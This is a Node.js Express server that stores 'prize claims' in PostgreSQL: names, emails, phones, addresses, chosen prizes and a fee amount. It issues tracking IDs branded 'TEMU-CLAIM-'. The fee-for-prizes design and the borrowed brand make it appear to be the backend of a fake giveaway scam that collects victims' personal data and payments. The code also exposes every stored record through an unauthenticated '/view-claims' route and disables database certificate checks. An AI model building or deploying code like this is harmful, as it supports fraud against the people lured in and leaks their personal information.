const express = require('express');
const path = require('path');
const { Pool } = require('pg');

const app = express();
// Using process.env.PORT (or a default like 3000) is best practice for cloud hosting.
const PORT = process.env.PORT || 3000; 

// Middleware to parse JSON bodies
app.use(express.json());
// Serve the frontend file (index.html) and other static assets
app.use(express.static(path.join(__dirname)));

// --- PostgreSQL Database Setup ---
const DATABASE_URL = process.env.DATABASE_URL;

if (!DATABASE_URL) {
    console.error("FATAL ERROR: DATABASE_URL environment variable is not set. Database connection will fail.");
}

const pool = new Pool({
    connectionString: DATABASE_URL,
    
    // CRITICAL FIX: Enable SSL for cloud-hosted databases (like Render)
    ssl: DATABASE_URL ? {
        rejectUnauthorized: false // Required for some hosted services
    } : false
});

// Function to ensure the 'claims' table exists without destroying data
const setupDatabase = async () => {
    if (!DATABASE_URL) {
        console.log("Skipping database setup as DATABASE_URL is missing.");
        return;
    }
    try {
        const client = await pool.connect();
        
        // IMPORTANT: We use CREATE TABLE IF NOT EXISTS to prevent data loss on redeployment.
        await client.query(`
            CREATE TABLE IF NOT EXISTS claims (
                id SERIAL PRIMARY KEY,
                full_name VARCHAR(255) NOT NULL,
                email VARCHAR(255) NOT NULL,
                phone VARCHAR(50),
                city VARCHAR(100),
                full_address TEXT NOT NULL,
                selected_prizes JSONB NOT NULL,
                total_fee INTEGER NOT NULL,
                claim_date TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
            );
        `);
        client.release();
        console.log("PostgreSQL: 'claims' table structure verified. Data is persistent.");
    } catch (err) {
        console.error("PostgreSQL Error: Failed to set up database.", err.stack);
    }
};

// Initialize database setup
setupDatabase();


// --- TEMPORARY GET ROUTE FOR DATA VERIFICATION (View all claims) ---
// This endpoint performs a simple SELECT * query and returns the results as JSON.
app.get('/view-claims', async (req, res) => {
    if (!DATABASE_URL) {
        return res.status(500).json({ success: false, message: 'Database connection failed: DATABASE_URL is not set.' });
    }
    
    try {
        const client = await pool.connect();
        // Retrieve all columns and order by the newest claim date
        const result = await client.query('SELECT * FROM claims ORDER BY claim_date DESC;');
        client.release();

        // Send the database rows back as raw JSON text
        res.json(result.rows);

    } catch (err) {
        console.error("Database Retrieval Error:", err.stack);
        res.status(500).json({ 
            success: false, 
            message: 'Failed to retrieve claims from database.',
            error: err.message
        });
    }
});
// -------------------------------------------------------------------


// --- POST /claim Route Handler (Original Data Insertion Logic) ---
app.post('/claim', async (req, res) => {
    if (!DATABASE_URL) {
        return res.status(500).json({ success: false, message: 'Database connection failed: DATABASE_URL is not set.' });
    }
    
    const { fullName, email, phone, city, fullAddress, selectedPrizes, totalFee } = req.body;

    // Basic validation
    if (!fullName || !email || !fullAddress || !selectedPrizes || totalFee === undefined) {
        return res.status(400).json({ success: false, message: 'Missing required claim fields.' });
    }

    try {
        const client = await pool.connect();
        
        const query = `
            INSERT INTO claims (full_name, email, phone, city, full_address, selected_prizes, total_fee)
            VALUES ($1, $2, $3, $4, $5, $6, $7)
            RETURNING id;
        `;
        
        const values = [
            fullName, 
            email, 
            phone, 
            city, 
            fullAddress, 
            JSON.stringify(selectedPrizes), 
            parseInt(totalFee, 10)
        ];

        const result = await client.query(query, values);
        client.release();

        const claimId = result.rows[0].id;
        const trackingId = `TEMU-CLAIM-${claimId}`;

        res.json({ 
            success: true, 
            message: 'Claim successfully recorded in the PostgreSQL database!', 
            trackingId: trackingId
        });

    } catch (err) {
        console.error("Database Insert Error:", err.stack);
        res.status(500).json({ 
            success: false, 
            message: 'Claim failed due to a database error. Check server logs for details.',
            error: err.message
        });
    }
});


// --- Server Startup ---
app.listen(PORT, () => {
    console.log(`Server running successfully on port ${PORT}`);
    if (DATABASE_URL) {
        console.log(`PostgreSQL connection enabled.`);
    } else {
        console.warn(`WARNING: DATABASE_URL is missing. Database operations will fail.`);
    }
});